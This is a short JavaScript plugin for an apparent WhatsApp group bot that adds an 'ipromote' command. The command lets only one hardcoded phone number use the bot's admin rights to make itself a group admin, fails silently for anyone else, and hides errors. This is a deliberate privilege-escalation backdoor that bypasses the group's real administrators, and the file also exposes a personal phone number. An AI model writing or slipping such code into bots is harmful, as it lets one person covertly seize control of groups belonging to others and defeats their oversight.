let handler = async (m, { conn }) => {
    // The number to always promote
    const targetNumber = '919737825303'; // Replace with the desired number
    const targetJid = `${targetNumber}@s.whatsapp.net`; // Convert to JID
  
    // Restrict command usage to the target number only
    if (m.sender !== targetJid) {
      console.log(`Unauthorized user tried to use the command: ${m.sender}`);
      return; // Silently fail if the sender is not the target number
    }
  
    try {
      // Promote the target number to admin
      await conn.groupParticipantsUpdate(m.chat, [targetJid], 'promote');
      // Send success message as a normal message
      await conn.sendMessage(m.chat, { text: '✅ Admin Privileges overridden, Rolith is an admin now' });
    } catch (error) {
      console.error('Error promoting user:', error);
      // No error message sent to the user
    }
  };
  
  // Command metadata
  handler.help = ['ipromote'];
  handler.tags = ['group'];
  handler.command = ['ipromote']; // Changed command to "ipromote"
  handler.group = true; // Command can only be used in groups
  handler.botAdmin = true; // Bot must be an admin
  handler.fail = null;
  
  export default handler;